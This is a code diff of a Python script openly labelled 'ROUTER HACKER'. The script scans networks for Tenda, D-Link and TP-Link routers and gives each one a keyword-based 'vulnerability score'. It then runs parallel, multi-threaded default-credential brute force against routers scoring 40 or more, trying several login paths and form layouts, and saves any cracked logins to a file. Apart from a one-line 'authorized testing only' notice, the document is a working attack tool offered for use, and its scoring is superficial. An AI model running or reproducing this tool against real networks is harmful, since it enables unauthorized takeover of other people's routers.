@@ -4,9 +4,9 @@
 """
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
-║     🌐 ROUTER HACKER - 100% WORKING ULTRA FAST 🌐         ║
-║     ⚡ Super Fast Scanner + Brute Force                   ║
-║     💀 Testing: admin, admin1, admin2, admin123           ║
+║     🌐 ROUTER HACKER - VULNERABILITY CHECKER 🌐           ║
+║     ⚡ Check Vulnerability First, Then Crack              ║
+║     💀 Tests: admin, admin1, admin2, admin123             ║
 ║     👑 Owner: Jumman                                       ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
@@ -23,8 +23,7 @@ import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
-import hashlib
-import base64
+import json
 
 # ============ PASSWORD PROTECTION ============
 REQUIRED_PASSWORD = "ch71"
@@ -35,7 +34,7 @@ def check_password():
     print("=" * 50)
     print("\n⚠️  This tool is password protected!")
     print("👑 Owner: Jumman")
-    print("📱 Version: 3.3 - 100% Working\n")
+    print("📱 Version: 3.4 - Vulnerability Checker\n")
     
     attempts = 3
     for attempt in range(attempts):
@@ -64,19 +63,34 @@ ROUTER_PORTS = [80, 8080, 443, 8081, 81, 82, 8000, 8443]
 LOGIN_PATHS = [
     '/', '/login', '/login.html', '/admin', '/cgi-bin/login',
     '/admin/login', '/system/login', '/goform/login',
-    '/login.cgi', '/index.html', '/cgi-bin/luci',
-    '/web/login', '/user/login', '/auth/login'
+    '/login.cgi', '/index.html', '/cgi-bin/luci'
 ]
 
-# ============ ROUTER BRANDS ============
 ROUTER_BRANDS = {
     'tenda': ['tenda', 'td-'],
     'dlink': ['d-link', 'dlink', 'dir-'],
     'tplink': ['tp-link', 'tplink', 'archer', 'deco']
 }
 
+# ============ VULNERABILITY PATTERNS ============
+VULNERABILITY_PATTERNS = {
+    'default_login_page': [
+        'login', 'admin', 'password', 'username', 'sign in'
+    ],
+    'default_title': [
+        'router', 'admin', 'login', 'configuration', 'management'
+    ],
+    'default_form_fields': [
+        'username', 'password', 'user', 'pass', 'pwd', 'login'
+    ],
+    'default_headers': [
+        'server: tenda', 'server: d-link', 'server: tp-link',
+        'x-powered-by: tenda', 'x-powered-by: d-link'
+    ]
+}
+
 # ============ SCANNER CLASS ============
-class UltraFastRouterHacker:
+class RouterVulnerabilityScanner:
     def __init__(self):
         self.session = requests.Session()
         self.session.verify = False
@@ -84,8 +98,9 @@ class UltraFastRouterHacker:
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         })
         self.results = []
+        self.vulnerable_routers = []
         self.cracked = []
-        self.found_routers = []
+        self.scan_count = 0
         
     def clear_screen(self):
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -94,16 +109,17 @@ class UltraFastRouterHacker:
         banner = """
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
-║     🌐 ROUTER HACKER - 100% WORKING 🌐                    ║
-║     ⚡ Ultra Fast Scanner & Brute Force                   ║
-║     💀 4 Passwords: admin, admin1, admin2, admin123       ║
+║     🌐 ROUTER HACKER - VULNERABILITY CHECKER 🌐           ║
+║     🔍 Check Vulnerability First, Then Crack              ║
+║     ⚡ Skip Secure Routers - Only Hack Vulnerable Ones    ║
+║     💀 Tests: admin, admin1, admin2, admin123             ║
 ║     👑 Owner: Jumman                                       ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
         """
         print(banner)
         print(f"[✓] Owner: Jumman")
-        print(f"[✓] Version: 3.3 - 100% Working")
+        print(f"[✓] Version: 3.4 - Vulnerability Checker")
         print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print("=" * 60)
     
@@ -168,7 +184,8 @@ class UltraFastRouterHacker:
                             'title': title,
                             'url': url,
                             'content': content,
-                            'response': response
+                            'response': response,
+                            'headers': response.headers
                         }
         except:
             pass
@@ -226,15 +243,116 @@ class UltraFastRouterHacker:
         except Exception as e:
             return {'error': str(e)}
     
-    # ============ 100% WORKING CREDENTIAL CHECKER ============
-    def try_all_passwords_ultra_fast(self, router):
-        """ULTRA FAST - Try all 4 passwords with multiple methods"""
+    # ============ VULNERABILITY CHECKER ============
+    def check_vulnerability(self, router):
+        """Check if router is vulnerable to default credentials"""
         ip = router['ip']
         port = router['port']
         protocol = 'https' if port == 443 else 'http'
         base_url = f"{protocol}://{ip}:{port}"
         
-        print(f"\n[🔑] Testing {ip}:{port} [{router['brand'].upper()}]")
+        vulnerability_score = 0
+        vulnerability_reasons = []
+        
+        print(f"\n[🔍] Checking vulnerability: {ip}:{port} [{router['brand'].upper()}]")
+        
+        try:
+            # Get the login page
+            response = self.session.get(base_url, timeout=2, allow_redirects=True)
+            content = response.text.lower()
+            headers = str(response.headers).lower()
+            
+            # === CHECK 1: Default login page ===
+            login_indicators = ['login', 'admin', 'password', 'username', 'sign in']
+            login_count = sum(1 for l in login_indicators if l in content)
+            if login_count >= 2:
+                vulnerability_score += 20
+                vulnerability_reasons.append("Default login page detected")
+                print(f"   ✅ Default login page detected")
+            else:
+                print(f"   ❌ No default login page")
+            
+            # === CHECK 2: Default title ===
+            title_keywords = ['router', 'admin', 'login', 'configuration']
+            title_match = any(k in content for k in title_keywords)
+            if title_match:
+                vulnerability_score += 15
+                vulnerability_reasons.append("Default router title detected")
+                print(f"   ✅ Default router title detected")
+            
+            # === CHECK 3: Default form fields ===
+            form_fields = ['username', 'password', 'user', 'pass', 'pwd']
+            field_match = any(f in content for f in form_fields)
+            if field_match:
+                vulnerability_score += 20
+                vulnerability_reasons.append("Default form fields detected")
+                print(f"   ✅ Default form fields detected")
+            
+            # === CHECK 4: Default headers ===
+            header_patterns = ['tenda', 'd-link', 'tp-link', 'dlink', 'tplink']
+            header_match = any(h in headers for h in header_patterns)
+            if header_match:
+                vulnerability_score += 15
+                vulnerability_reasons.append("Default server headers detected")
+                print(f"   ✅ Default server headers detected")
+            
+            # === CHECK 5: No security headers ===
+            security_headers = ['x-frame-options', 'content-security-policy', 'x-xss-protection']
+            has_security = any(h in headers for h in security_headers)
+            if not has_security:
+                vulnerability_score += 15
+                vulnerability_reasons.append("No security headers detected")
+                print(f"   ✅ No security headers (vulnerable)")
+            else:
+                print(f"   ❌ Security headers present")
+            
+            # === CHECK 6: Response time ===
+            if response.elapsed.total_seconds() < 0.5:
+                vulnerability_score += 10
+                vulnerability_reasons.append("Fast response time")
+                print(f"   ✅ Fast response time")
+            
+            # === CHECK 7: Default error pages ===
+            error_patterns = ['404', 'not found', 'error', 'invalid']
+            has_error = any(e in content for e in error_patterns)
+            if has_error:
+                vulnerability_score += 5
+                vulnerability_reasons.append("Default error pages")
+                print(f"   ✅ Default error pages")
+            
+            # === DETERMINE VULNERABILITY ===
+            is_vulnerable = vulnerability_score >= 40
+            
+            print(f"\n   📊 Vulnerability Score: {vulnerability_score}/100")
+            print(f"   🔐 Status: {'VULNERABLE ✅' if is_vulnerable else 'SECURE ❌'}")
+            
+            if vulnerability_reasons:
+                print(f"   📋 Reasons: {', '.join(vulnerability_reasons[:3])}")
+            
+            router['vulnerability_score'] = vulnerability_score
+            router['vulnerability_reasons'] = vulnerability_reasons
+            router['is_vulnerable'] = is_vulnerable
+            
+            return is_vulnerable
+            
+        except Exception as e:
+            print(f"   ❌ Error checking vulnerability: {e}")
+            return False
+    
+    # ============ CREDENTIAL TESTER ============
+    def try_all_passwords(self, router):
+        """Try all 4 passwords on vulnerable router"""
+        if not router.get('is_vulnerable', False):
+            print(f"\n[⏭️] Skipping {router['ip']} - Not vulnerable")
+            return None
+        
+        ip = router['ip']
+        port = router['port']
+        protocol = 'https' if port == 443 else 'http'
+        base_url = f"{protocol}://{ip}:{port}"
+        
+        print(f"\n[💀] Attempting to crack: {ip}:{port} [{router['brand'].upper()}]")
+        print(f"   Vulnerability Score: {router.get('vulnerability_score', 0)}/100")
         
         # Get the login page to analyze
         try:
@@ -243,13 +361,12 @@ class UltraFastRouterHacker:
         except:
             content = ""
         
-        # Detect login form action and fields
         login_action, form_fields = self.detect_login_form(content, base_url)
         
         for username, password in TEST_CREDENTIALS:
             print(f"    Trying: {username}:{password}", end=' ')
             
-            # === METHOD 1: Direct POST to login action ===
+            # === METHOD 1: Direct POST ===
             if login_action:
                 try:
                     data = {}
@@ -277,7 +394,7 @@ class UltraFastRouterHacker:
                 except:
                     pass
             
-            # === METHOD 2: Try all form variations ===
+            # === METHOD 2: Form variations ===
             form_variations = [
                 {'username': username, 'password': password},
                 {'user': username, 'pass': password},
@@ -295,7 +412,6 @@ class UltraFastRouterHacker:
                 {'un': username, 'pw': password},
             ]
             
-            # Try each login path with form variations
             for path in LOGIN_PATHS:
                 url = base_url + path
                 
@@ -363,11 +479,9 @@ class UltraFastRouterHacker:
         return None
     
     def detect_login_form(self, html_content, base_url):
-        """Detect login form action and fields"""
         action = None
         fields = []
         
-        # Find form
         form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
         action_match = re.search(form_pattern, html_content, re.IGNORECASE)
         
@@ -379,7 +493,6 @@ class UltraFastRouterHacker:
                 else:
                     action = base_url + '/' + action
         
-        # Find input fields
         input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
         inputs = re.findall(input_pattern, html_content, re.IGNORECASE)
         
@@ -387,7 +500,6 @@ class UltraFastRouterHacker:
             if inp.lower() not in ['submit', 'button', 'reset']:
                 fields.append(inp)
         
-        # If no form found, use default
         if not action:
             action = base_url + '/login'
             fields = ['username', 'password']
@@ -395,95 +507,92 @@ class UltraFastRouterHacker:
         return action, fields
     
     def is_logged_in(self, response, username, password):
-        """100% ACCURATE login detection"""
-        
-        # Check status code
         if response.status_code == 200:
             content = response.text.lower()
             
-            # === FAILURE DETECTION ===
             failure_patterns = [
                 'invalid', 'incorrect', 'failed', 'error', 'denied',
                 'unauthorized', 'wrong', 'retry', 'try again',
                 'login failed', 'authentication failed', 'access denied',
-                'invalid username', 'invalid password', 'incorrect password',
-                'please try again', 'authentication error', 'access error',
-                'login error', 'password error', 'username error',
-                'not authorized', 'permission denied', 'forbidden'
+                'invalid username', 'invalid password', 'incorrect password'
             ]
             
             for pattern in failure_patterns:
                 if pattern in content:
                     return False
             
-            # === SUCCESS DETECTION ===
             success_patterns = [
                 'welcome', 'dashboard', 'status', 'configuration',
                 'logout', 'settings', 'admin', 'main', 'index',
                 'home', 'panel', 'console', 'management', 'network',
                 'overview', 'system', 'wireless', 'firewall', 'wan', 'lan',
-                'connected', 'success', 'redirecting', 'control',
-                'tools', 'diagnostic', 'advanced', 'setup',
-                'signed in', 'logged in', 'session', 'authenticated'
+                'connected', 'success', 'redirecting'
             ]
             
             for pattern in success_patterns:
                 if pattern in content:
-                    # Make sure we're not on login page
                     login_indicators = ['login', 'username', 'password', 'sign in']
                     login_count = sum(1 for l in login_indicators if l in content)
-                    
-                    if login_count < 2:  # Less than 2 login indicators = logged in
+                    if login_count < 2:
                         return True
             
-            # === REDIRECT DETECTION ===
             if 'window.location' in content or 'window.location.href' in content:
                 return True
             
-            if '<meta http-equiv="refresh"' in content:
-                return True
-            
-            # === COOKIE CHECK ===
             if response.cookies:
                 for cookie in response.cookies:
                     cookie_name = cookie.name.lower()
                     if 'session' in cookie_name or 'auth' in cookie_name or 'login' in cookie_name:
                         return True
         
-        # === REDIRECT STATUS CODES ===
         if response.status_code in [301, 302, 303, 307, 308]:
             location = response.headers.get('Location', '').lower()
             success_redirects = ['admin', 'dashboard', 'main', 'index', 'home', 
-                               'welcome', 'status', 'overview', 'system', 'control']
+                               'welcome', 'status', 'overview', 'system']
             for s in success_redirects:
                 if s in location:
                     return True
-            # Redirect away from login = success
             if 'login' not in location:
                 return True
         
-        # === CONTENT LENGTH CHANGE ===
-        if hasattr(response, 'history') and response.history:
-            # Check if we were redirected
-            return True
-        
         return False
     
-    def crack_routers_parallel(self, routers):
-        """Crack all routers in parallel - ULTRA FAST"""
+    # ============ PROCESS ROUTERS ============
+    def process_routers(self, routers):
+        """Check vulnerability and crack only vulnerable ones"""
         if not routers:
-            return []
+            return [], []
         
-        print(f"\n💀 Brute forcing {len(routers)} routers with 4 passwords...")
+        vulnerable = []
+        not_vulnerable = []
+        
+        print(f"\n🔍 Checking vulnerability for {len(routers)} routers...")
         print("=" * 60)
-        print("📌 Testing: admin, admin1, admin2, admin123")
+        
+        # Check vulnerability for each router
+        for router in routers:
+            is_vulnerable = self.check_vulnerability(router)
+            if is_vulnerable:
+                vulnerable.append(router)
+            else:
+                not_vulnerable.append(router)
+        
+        print("\n" + "=" * 60)
+        print(f"📊 Vulnerability Summary:")
+        print(f"   ✅ Vulnerable Routers: {len(vulnerable)}")
+        print(f"   ❌ Secure Routers: {len(not_vulnerable)}")
+        print("=" * 60)
+        
+        if not vulnerable:
+            print("\n❌ No vulnerable routers found. Skipping password cracking.")
+            return [], []
+        
+        print(f"\n💀 Proceeding to crack {len(vulnerable)} vulnerable routers...")
         print("=" * 60)
         
         cracked = []
-        
-        # Use ThreadPoolExecutor for parallel cracking
         with ThreadPoolExecutor(max_workers=30) as executor:
-            futures = {executor.submit(self.try_all_passwords_ultra_fast, router): router for router in routers}
+            futures = {executor.submit(self.try_all_passwords, router): router for router in vulnerable}
             
             for future in as_completed(futures):
                 router = futures[future]
@@ -497,7 +606,8 @@ class UltraFastRouterHacker:
                             'username': result['username'],
                             'password': result['password'],
                             'url': result['url'],
-                            'method': result.get('method', 'unknown')
+                            'method': result.get('method', 'unknown'),
+                            'vulnerability_score': router.get('vulnerability_score', 0)
                         })
                         print(f"\n✅✅✅ CRACKED! {router['ip']} [{router['brand'].upper()}]")
                         print(f"   👤 {result['username']}:{result['password']}")
@@ -506,19 +616,19 @@ class UltraFastRouterHacker:
                 except Exception as e:
                     pass
         
-        return cracked
+        return vulnerable, cracked
     
-    def save_results(self, routers, cracked):
-        """Save results to file"""
-        filename = f"router_hack_{int(time.time())}.txt"
+    def save_results(self, routers, vulnerable, cracked):
+        filename = f"router_scan_{int(time.time())}.txt"
         
         try:
             with open(filename, 'w') as f:
                 f.write("=" * 60 + "\n")
-                f.write("🌐 ROUTER HACK RESULTS - JUMMAN EDITION\n")
+                f.write("🌐 ROUTER SCAN RESULTS - JUMMAN EDITION\n")
                 f.write("=" * 60 + "\n")
                 f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                f.write(f"Routers Found: {len(routers)}\n")
+                f.write(f"Total Routers Found: {len(routers)}\n")
+                f.write(f"Vulnerable Routers: {len(vulnerable)}\n")
                 f.write(f"Routers Cracked: {len(cracked)}\n")
                 f.write("=" * 60 + "\n\n")
                 
@@ -530,7 +640,18 @@ class UltraFastRouterHacker:
                         f.write(f"   👤 {c['username']}:{c['password']}\n")
                         f.write(f"   🔗 {c['url']}\n")
                         f.write(f"   📌 Method: {c.get('method', 'unknown')}\n")
+                        f.write(f"   📊 Vulnerability Score: {c.get('vulnerability_score', 0)}/100\n")
                         f.write("-" * 40 + "\n")
+                
+                if vulnerable:
+                    f.write("\n🔓 VULNERABLE ROUTERS (Not Cracked):\n")
+                    f.write("-" * 40 + "\n")
+                    for i, r in enumerate(vulnerable, 1):
+                        if r not in [c['ip'] for c in cracked]:
+                            f.write(f"{i}. {r['ip']}:{r['port']} [{r['brand'].upper()}]\n")
+                            f.write(f"   📊 Vulnerability Score: {r.get('vulnerability_score', 0)}/100\n")
+                            f.write(f"   📋 Reasons: {', '.join(r.get('vulnerability_reasons', [])[:3])}\n")
+                            f.write("-" * 40 + "\n")
                 
                 if routers:
                     f.write("\n🌐 ALL ROUTERS FOUND:\n")
@@ -539,6 +660,7 @@ class UltraFastRouterHacker:
                         f.write(f"{i}. {r['ip']}:{r['port']} [{r['brand'].upper()}]\n")
                         f.write(f"   Title: {r['title']}\n")
                         f.write(f"   URL: {r['url']}\n")
+                        f.write(f"   Vulnerable: {'✅ Yes' if r.get('is_vulnerable', False) else '❌ No'}\n")
                         f.write("-" * 40 + "\n")
             
             print(f"\n✅ Results saved to: {filename}")
@@ -546,7 +668,6 @@ class UltraFastRouterHacker:
             print(f"\n❌ Error saving: {e}")
     
     def run(self):
-        """Main execution"""
         self.clear_screen()
         self.print_banner()
         
@@ -554,12 +675,12 @@ class UltraFastRouterHacker:
         print("This tool is for authorized testing only.")
         print("Unauthorized access to routers is illegal.\n")
         
-        print("⚡ SUPER FAST MODE ENABLED!")
-        print("💀 Testing ONLY 4 Passwords:")
-        print("   • admin:admin")
-        print("   • admin:admin1")
-        print("   • admin:admin2")
-        print("   • admin:admin123\n")
+        print("⚡ HOW IT WORKS:")
+        print("   1️⃣ Scan for routers (Tenda, D-Link, TP-Link)")
+        print("   2️⃣ Check vulnerability of each router")
+        print("   3️⃣ Skip secure routers (not vulnerable)")
+        print("   4️⃣ Attempt password cracking on vulnerable routers only")
+        print("   5️⃣ Tests: admin, admin1, admin2, admin123\n")
         
         print("📌 SCAN OPTIONS:")
         print("1. Quick Scan (Local Network - 50 IPs)")
@@ -594,12 +715,13 @@ class UltraFastRouterHacker:
             if routers:
                 print(f"\n[✓] Found {len(routers)} routers in {elapsed:.2f} seconds")
                 
-                cracked = self.crack_routers_parallel(routers)
+                vulnerable, cracked = self.process_routers(routers)
                 
                 print("\n" + "=" * 60)
-                print("📊 SUMMARY")
+                print("📊 FINAL SUMMARY")
                 print("=" * 60)
                 print(f"Routers Found: {len(routers)}")
+                print(f"Vulnerable Routers: {len(vulnerable)}")
                 print(f"Routers Cracked: {len(cracked)}")
                 print(f"Time Taken: {elapsed:.2f} seconds")
                 
@@ -608,11 +730,11 @@ class UltraFastRouterHacker:
                     for c in cracked:
                         print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
                         print(f"   🔗 {c['url']}")
-                        print(f"   📌 Method: {c.get('method', 'unknown')}")
+                        print(f"   📊 Score: {c.get('vulnerability_score', 0)}/100")
                 
                 save = input("\n💾 Save results? (y/n): ").strip().lower()
                 if save == 'y':
-                    self.save_results(routers, cracked)
+                    self.save_results(routers, vulnerable, cracked)
             else:
                 print("\n❌ No routers found!")
         
@@ -637,12 +759,13 @@ class UltraFastRouterHacker:
             if routers:
                 print(f"\n[✓] Found {len(routers)} routers in {elapsed:.2f} seconds")
                 
-                cracked = self.crack_routers_parallel(routers)
+                vulnerable, cracked = self.process_routers(routers)
                 
                 print("\n" + "=" * 60)
-                print("📊 SUMMARY")
+                print("📊 FINAL SUMMARY")
                 print("=" * 60)
                 print(f"Routers Found: {len(routers)}")
+                print(f"Vulnerable Routers: {len(vulnerable)}")
                 print(f"Routers Cracked: {len(cracked)}")
                 print(f"Time Taken: {elapsed:.2f} seconds")
                 
@@ -654,7 +777,7 @@ class UltraFastRouterHacker:
                 
                 save = input("\n💾 Save results? (y/n): ").strip().lower()
                 if save == 'y':
-                    self.save_results(routers, cracked)
+                    self.save_results(routers, vulnerable, cracked)
             else:
                 print("\n❌ No routers found!")
         
@@ -683,12 +806,13 @@ class UltraFastRouterHacker:
             if all_routers:
                 print(f"\n[✓] Found {len(all_routers)} routers in {elapsed:.2f} seconds")
                 
-                cracked = self.crack_routers_parallel(all_routers)
+                vulnerable, cracked = self.process_routers(all_routers)
                 
                 print("\n" + "=" * 60)
-                print("📊 SUMMARY")
+                print("📊 FINAL SUMMARY")
                 print("=" * 60)
                 print(f"Routers Found: {len(all_routers)}")
+                print(f"Vulnerable Routers: {len(vulnerable)}")
                 print(f"Routers Cracked: {len(cracked)}")
                 print(f"Time Taken: {elapsed:.2f} seconds")
                 
@@ -700,7 +824,7 @@ class UltraFastRouterHacker:
                 
                 save = input("\n💾 Save results? (y/n): ").strip().lower()
                 if save == 'y':
-                    self.save_results(all_routers, cracked)
+                    self.save_results(all_routers, vulnerable, cracked)
             else:
                 print("\n❌ No routers found!")
         
@@ -725,7 +849,7 @@ def main():
             print("[*] Installing requests...")
             subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
         
-        scanner = UltraFastRouterHacker()
+        scanner = RouterVulnerabilityScanner()
         while True:
             scanner.run()
             
